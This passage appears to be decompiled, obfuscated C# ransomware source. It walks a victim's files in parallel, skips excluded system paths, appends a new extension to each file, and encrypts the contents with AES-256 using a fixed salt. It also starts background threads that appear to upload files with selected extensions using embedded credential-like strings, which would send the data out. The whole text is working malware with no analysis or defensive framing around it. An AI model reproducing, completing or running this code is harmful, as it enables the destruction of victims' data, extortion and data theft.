										}
										else
										{
											sgeKhRYEDh(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, bytes3);
										}
									}
									goto IL_1119;
								}
								CS_0024_003C_003E8__locals0 = new NxpTIMrohu.RSTKtTJHsROT();
								CS_0024_003C_003E8__locals0.LmjDJUAApMbEj = CS_0024_003C_003E8__locals1;
								CS_0024_003C_003E8__locals0.KkLhvrADszGGi = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ != NxpTIMrohu.getString_0(107386551))
									{
										if (mYYMBtfmlAOyF)
										{
											CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ = zmgIWyNctPwjW + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ;
										}
										File.Move(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ);
									}
								}
								catch (Exception ex27)
								{
									if (MvyzXvhzMsIEWT)
									{
										try
										{
											File.AppendAllText(knClGxGTQzcKgW, NxpTIMrohu.getString_0(107387323) + CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + NxpTIMrohu.getString_0(107402578) + ex27.Message + NxpTIMrohu.getString_0(107395942));
										}
										catch (Exception)
										{
										}
									}
									bBKKzTBaLJVhdj++;
									goto end_IL_08ba_2;
								}
								CS_0024_003C_003E8__locals0.JpKUkieOmB = NxpTIMrohu.getString_0(107389606);
								if (CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ != NxpTIMrohu.getString_0(107386551))
								{
									CS_0024_003C_003E8__locals0.JpKUkieOmB = CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ;
								}
								else
								{
									CS_0024_003C_003E8__locals0.JpKUkieOmB = CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv;
								}
								if (FGSbbxnupor == NxpTIMrohu.getString_0(107396834))
								{
									Thread thread4 = new Thread((ThreadStart)delegate
									{
										foreach (string item in SkvTXsJINBztMRD)
										{
											if (CS_0024_003C_003E8__locals0.JpKUkieOmB.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.KkLhvrADszGGi.ultCKTLdBIeqJ) && eiZgJNzJZhH == NxpTIMrohu.RSTKtTJHsROT.getString_0(107396841))
											{
												if (Convert.ToInt32(QBNkovNHjRPLm) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.JpKUkieOmB).Length)
												{
													try
													{
														PpFuqDxUfCPuFpcCn.yOpVYrZhtvsYB(NxpTIMrohu.RSTKtTJHsROT.getString_0(107389726), NxpTIMrohu.RSTKtTJHsROT.getString_0(107389721), NxpTIMrohu.RSTKtTJHsROT.getString_0(107389676), CS_0024_003C_003E8__locals0.JpKUkieOmB);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.JpKUkieOmB.ToLower().EndsWith(item) && eiZgJNzJZhH == NxpTIMrohu.RSTKtTJHsROT.getString_0(107396407))
											{
												try
												{
													PpFuqDxUfCPuFpcCn.yOpVYrZhtvsYB(NxpTIMrohu.RSTKtTJHsROT.getString_0(107389726), NxpTIMrohu.RSTKtTJHsROT.getString_0(107389721), NxpTIMrohu.RSTKtTJHsROT.getString_0(107389676), CS_0024_003C_003E8__locals0.JpKUkieOmB);
												}
												catch
												{
												}
											}
										}
									});
									thread4.Priority = ThreadPriority.Normal;
									thread4.IsBackground = false;
									thread4.Start();
								}
								string text7 = COHaNSLBjuDxHFZgW.zPVjtudhZgOqH(32);
								string text8 = NxpTIMrohu.getString_0(107389606);
								text8 = (dludHStvHyTu ? COHaNSLBjuDxHFZgW.POLqBalRuwH() : NxpTIMrohu.getString_0(107389606));
								string s4 = wAtanfYbhauOuKP.MvqOeoNjtEKI(text7 + text8);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (IiqKblfhNFuY == NxpTIMrohu.getString_0(107396400))
								{
									byte[] array2 = null;
									byte[] byte_2 = hLhUwUDAhWMjzuB.DfGjgEHjZJUE(CS_0024_003C_003E8__locals0.JpKUkieOmB, Convert.ToInt32(vmbpzaFVaVU) * 1024 * 1024);
									if (hLhUwUDAhWMjzuB.LDXgNdvfAheSqfs(yTrxIKISCfGp: (!CcJcTYoshtYbPYb) ? (dludHStvHyTu ? hLhUwUDAhWMjzuB.kRJzGPxkoWlQg(byte_2, Convert.FromBase64String(text7), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : hLhUwUDAhWMjzuB.kRJzGPxkoWlQg(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MmaHtQgyFtb), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (dludHStvHyTu ? DlKGxPgDEDy.AxAOLtoppUjMDv(byte_2, Convert.FromBase64String(text7), Convert.FromBase64String(text8)) : DlKGxPgDEDy.AxAOLtoppUjMDv(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MmaHtQgyFtb), Convert.FromBase64String(zSiinLyeiNOaQic))), KyClZYkMZEgn: CS_0024_003C_003E8__locals0.JpKUkieOmB, xPcAnAVJYVtBl: bytes4))
									{
										goto IL_1119;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv);
									}
									catch (Exception)
									{
									}
								}
								else if (!dludHStvHyTu)
								{
									if (UBFsZsHuzIVCuyiH.HAYNDKhQUXPc(CS_0024_003C_003E8__locals0.JpKUkieOmB, vmbpzaFVaVU, CS_0024_003C_003E8__locals0.MmaHtQgyFtb, null, Convert.FromBase64String(zSiinLyeiNOaQic)))
									{
										goto IL_1119;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (UBFsZsHuzIVCuyiH.HAYNDKhQUXPc(CS_0024_003C_003E8__locals0.JpKUkieOmB, vmbpzaFVaVU, text7, bytes4, Convert.FromBase64String(text8)))
									{
										goto IL_1119;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv);
									}
									catch (Exception)
									{
									}
								}
								end_IL_08ba_2:;
							}
							catch (Exception)
							{
								goto IL_1119;
							}
						}
					}
					continue;
					IL_1119:
					CS_0024_003C_003E8__locals0.RXnxbMGGkHM.Remove(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.RXnxbMGGkHM, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new NxpTIMrohu.wIiqciEKsSgyz();
			CS_0024_003C_003E8__locals0.KkLhvrADszGGi = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv = string_0;
			if (!CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107389062)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107389549)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107389516)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107389531)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107389486)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107389493)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107389472)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107389459)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107389414)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107389409)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107389400)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107389351)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107389325)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107389336)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388799)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388750)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388765)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388716)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388731)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388682)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388697)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388648)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388667)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388614)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107388633)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107388588)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107388603)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(NxpTIMrohu.getString_0(107388554)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(ZvzUuZdcuZvZyuA(NxpTIMrohu.getString_0(107388569))) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107389056)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107397084)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107389043)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.EndsWith(CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.EndsWith(NxpTIMrohu.getString_0(107389018)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.EndsWith(NxpTIMrohu.getString_0(107389013)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.EndsWith(NxpTIMrohu.getString_0(107388976)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.EndsWith(NxpTIMrohu.getString_0(107388971)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(NxpTIMrohu.getString_0(107388966)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(hdtcmoyGEV) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(knClGxGTQzcKgW) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(WkbYpntLeHaVcf))
			{
				if (CS_0024_003C_003E8__locals0.omzlEvaIgXI.Length != 0)
				{
					string[] omzlEvaIgXI = CS_0024_003C_003E8__locals0.omzlEvaIgXI;
					int num = 0;
					while (num < omzlEvaIgXI.Length)
					{
						string value = omzlEvaIgXI[num];
						if (!CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1094;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.EndsWith(CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ))
					{
						goto IL_1094;
					}
				}
				catch (Exception)
				{
					goto IL_1094;
				}
				if (!bTWTPdqAFFpauU.Contains(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv))
				{
					if (JvLbPnAiNtPFl == NxpTIMrohu.getString_0(107396834))
					{
						try
						{
							if (xNneCkeMZRvxQg.rdTUqItxjMreSCf(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv))
							{
								xNneCkeMZRvxQg.IliDSuvIRJoA(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
							}
						}
						catch
						{
						}
					}
					bTWTPdqAFFpauU.Add(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
					Thread thread = new Thread((ThreadStart)delegate
					{
						try
						{
							if (hdAepnrmnch)
							{
								Console.WriteLine(NxpTIMrohu.wIiqciEKsSgyz.getString_0(107402491) + CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + NxpTIMrohu.wIiqciEKsSgyz.getString_0(107402900) + new FileInfo(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv).Length + NxpTIMrohu.wIiqciEKsSgyz.getString_0(107402911));
								Console.WriteLine(NxpTIMrohu.wIiqciEKsSgyz.getString_0(107402498), bTWTPdqAFFpauU.Count, ZxYqzVUoLKX, bBKKzTBaLJVhdj);
								Console.WriteLine(NxpTIMrohu.wIiqciEKsSgyz.getString_0(107402441), iprsjxEHICCj.Elapsed);
								Console.WriteLine(NxpTIMrohu.wIiqciEKsSgyz.getString_0(107403382));
							}
						}
						catch
						{
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (!cVxpfEOwEmPC.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv)))
					{
						cVxpfEOwEmPC.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv));
					}
					DnuJfeBIbLhr(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
					try
					{
						new NTQxrgSdsWceAc().mAZxWbHOwVEf(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (hdAepnrmnch)
								{
									Console.WriteLine(NxpTIMrohu.getString_0(107402967) + CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + NxpTIMrohu.getString_0(107402890) + new FileInfo(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv).Length + NxpTIMrohu.getString_0(107402901));
									Console.WriteLine(NxpTIMrohu.getString_0(107403372));
								}
							}
							catch
							{
							}
							mFLmLCPYHuB(ZvzUuZdcuZvZyuA(NxpTIMrohu.getString_0(107403267)), NxpTIMrohu.getString_0(107388914) + CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + NxpTIMrohu.getString_0(107388914) + ZvzUuZdcuZvZyuA(NxpTIMrohu.getString_0(107403242)) + NxpTIMrohu.getString_0(107388914) + Environment.UserName + NxpTIMrohu.getString_0(107388914) + ZvzUuZdcuZvZyuA(NxpTIMrohu.getString_0(107403257)));
						}
					}
					catch (Exception ex2)
					{
						if (MvyzXvhzMsIEWT)
						{
							try
							{
								File.AppendAllText(knClGxGTQzcKgW, NxpTIMrohu.getString_0(107387323) + CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + NxpTIMrohu.getString_0(107403232) + ex2.Message + NxpTIMrohu.getString_0(107395942));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv).Length != 0L)
							{
								goto end_IL_0887;
							}
							goto end_IL_0887_2;
							end_IL_0887:;
						}
						catch (Exception ex4)
						{
							if (MvyzXvhzMsIEWT)
							{
								try
								{
									File.AppendAllText(knClGxGTQzcKgW, NxpTIMrohu.getString_0(107387323) + CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + NxpTIMrohu.getString_0(107402607) + ex4.Message + NxpTIMrohu.getString_0(107395942));
								}
								catch (Exception)
								{
								}
							}
							bBKKzTBaLJVhdj++;
							goto end_IL_0887_2;
						}
						if (AjDKbvSruxge == NxpTIMrohu.getString_0(107396834) && new FileInfo(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv).Length > Convert.ToInt32(vmbpzaFVaVU) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ != NxpTIMrohu.getString_0(107386551))
								{
									if (mYYMBtfmlAOyF)
									{
										CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ = zmgIWyNctPwjW + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ;
									}
									File.Move(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ);
								}
							}
							catch (Exception ex6)
							{
								if (MvyzXvhzMsIEWT)
								{
									try
									{
										File.AppendAllText(knClGxGTQzcKgW, NxpTIMrohu.getString_0(107387323) + CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + NxpTIMrohu.getString_0(107402578) + ex6.Message + NxpTIMrohu.getString_0(107395942));
									}
									catch (Exception)
									{
									}
								}
								bBKKzTBaLJVhdj++;
								return;
							}
							if (CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ != NxpTIMrohu.getString_0(107386551))
							{
								CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv += CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ;
							}
							if (FGSbbxnupor == NxpTIMrohu.getString_0(107396834))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in SkvTXsJINBztMRD)
									{
										if (CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.KkLhvrADszGGi.ultCKTLdBIeqJ) && eiZgJNzJZhH == NxpTIMrohu.wIiqciEKsSgyz.getString_0(107396844))
										{
											if (Convert.ToInt32(QBNkovNHjRPLm) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv).Length)
											{
												try
												{
													PpFuqDxUfCPuFpcCn.yOpVYrZhtvsYB(NxpTIMrohu.wIiqciEKsSgyz.getString_0(107389729), NxpTIMrohu.wIiqciEKsSgyz.getString_0(107389724), NxpTIMrohu.wIiqciEKsSgyz.getString_0(107389679), CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().EndsWith(item2) && eiZgJNzJZhH == NxpTIMrohu.wIiqciEKsSgyz.getString_0(107396410))
										{
											try
											{
												PpFuqDxUfCPuFpcCn.yOpVYrZhtvsYB(NxpTIMrohu.wIiqciEKsSgyz.getString_0(107389729), NxpTIMrohu.wIiqciEKsSgyz.getString_0(107389724), NxpTIMrohu.wIiqciEKsSgyz.getString_0(107389679), CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
											}
											catch
											{
											}
										}
									}
								});
								thread2.IsBackground = false;
								thread2.Priority = ThreadPriority.Normal;
								thread2.Start();
							}
							string text = COHaNSLBjuDxHFZgW.zPVjtudhZgOqH(32);
							string text2 = NxpTIMrohu.getString_0(107389606);
							text2 = (dludHStvHyTu ? COHaNSLBjuDxHFZgW.POLqBalRuwH() : NxpTIMrohu.getString_0(107389606));
							string s = wAtanfYbhauOuKP.MvqOeoNjtEKI(text + text2);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (IiqKblfhNFuY == NxpTIMrohu.getString_0(107396400))
							{
								byte[] array = null;
								byte[] byte_ = hLhUwUDAhWMjzuB.DfGjgEHjZJUE(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, Convert.ToInt32(vmbpzaFVaVU) * 1024 * 1024);
								if (!hLhUwUDAhWMjzuB.LDXgNdvfAheSqfs(yTrxIKISCfGp: (!CcJcTYoshtYbPYb) ? (dludHStvHyTu ? hLhUwUDAhWMjzuB.kRJzGPxkoWlQg(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : hLhUwUDAhWMjzuB.kRJzGPxkoWlQg(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MmaHtQgyFtb), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (dludHStvHyTu ? DlKGxPgDEDy.AxAOLtoppUjMDv(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : DlKGxPgDEDy.AxAOLtoppUjMDv(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MmaHtQgyFtb), Convert.FromBase64String(zSiinLyeiNOaQic))), KyClZYkMZEgn: CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, xPcAnAVJYVtBl: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!dludHStvHyTu)
							{
								if (!UBFsZsHuzIVCuyiH.HAYNDKhQUXPc(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, vmbpzaFVaVU, CS_0024_003C_003E8__locals0.MmaHtQgyFtb, null, Convert.FromBase64String(zSiinLyeiNOaQic)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!UBFsZsHuzIVCuyiH.HAYNDKhQUXPc(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, vmbpzaFVaVU, text, bytes, Convert.FromBase64String(text2)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (mYYMBtfmlAOyF)
							{
								CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ = zmgIWyNctPwjW + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ;
							}
							string text3 = COHaNSLBjuDxHFZgW.zPVjtudhZgOqH(32);
							string text4 = NxpTIMrohu.getString_0(107389606);
							text4 = (dludHStvHyTu ? COHaNSLBjuDxHFZgW.POLqBalRuwH() : NxpTIMrohu.getString_0(107389606));
							string s2 = wAtanfYbhauOuKP.MvqOeoNjtEKI(text3 + text4);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ != NxpTIMrohu.getString_0(107386551))
							{
								if (!kIbCIqqAMtB)
								{
									if (!dludHStvHyTu)
									{
										FzWLEbFhnFTpMlZv(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ, INlpeyNXGAcMRYsht);
									}
									else
									{
										FzWLEbFhnFTpMlZv(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ, Convert.FromBase64String(text3));
									}
								}
								else
								{
									try
									{
										if (!dludHStvHyTu)
										{
											EPFgKsSOzMWL(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ, INlpeyNXGAcMRYsht, Convert.FromBase64String(zSiinLyeiNOaQic));
										}
										else
										{
											EPFgKsSOzMWL(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
										}
									}
									catch (Exception ex11)
									{
										if (MvyzXvhzMsIEWT)
										{
											try
											{
												File.AppendAllText(knClGxGTQzcKgW, NxpTIMrohu.getString_0(107387323) + CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + NxpTIMrohu.getString_0(107386505) + ex11.Message + NxpTIMrohu.getString_0(107395942));
											}
											catch (Exception)
											{
											}
										}
										bBKKzTBaLJVhdj++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!kIbCIqqAMtB)
							{
								if (!dludHStvHyTu)
								{
									FzWLEbFhnFTpMlZv(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + NxpTIMrohu.getString_0(107386546), INlpeyNXGAcMRYsht);
								}
								else
								{
									FzWLEbFhnFTpMlZv(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + NxpTIMrohu.getString_0(107386546), Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!dludHStvHyTu)
									{
										EPFgKsSOzMWL(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, INlpeyNXGAcMRYsht, Convert.FromBase64String(zSiinLyeiNOaQic));
									}
									else
									{
										EPFgKsSOzMWL(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex14)
								{
									if (MvyzXvhzMsIEWT)
									{
										try
										{
											File.AppendAllText(knClGxGTQzcKgW, NxpTIMrohu.getString_0(107387323) + CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + NxpTIMrohu.getString_0(107386505) + ex14.Message + NxpTIMrohu.getString_0(107395942));
										}
										catch (Exception)
										{
										}
									}
									bBKKzTBaLJVhdj++;
									return;
								}
							}
							if (dludHStvHyTu)
							{
								if (CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ != NxpTIMrohu.getString_0(107386551))
								{
									sgeKhRYEDh(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + CS_0024_003C_003E8__locals0.ultCKTLdBIeqJ, bytes2);
								}
								else
								{
									sgeKhRYEDh(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, bytes2);
								}
							}
						}
						end_IL_0887_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1094;
			IL_1094:
			CS_0024_003C_003E8__locals0.RXnxbMGGkHM.Remove(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
		});
	}

	private static void CgmxXIFkBUDnX(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (FGSbbxnupor == getString_0(107396816))
					{
						foreach (string item in SkvTXsJINBztMRD)
						{
							if (string_0.ToLower().EndsWith(item) && eiZgJNzJZhH == getString_0(107396816))
							{
								if (Convert.ToInt32(QBNkovNHjRPLm) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										PpFuqDxUfCPuFpcCn.yOpVYrZhtvsYB(getString_0(107389701), getString_0(107389696), getString_0(107389651), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && eiZgJNzJZhH == getString_0(107396382))
							{
								try
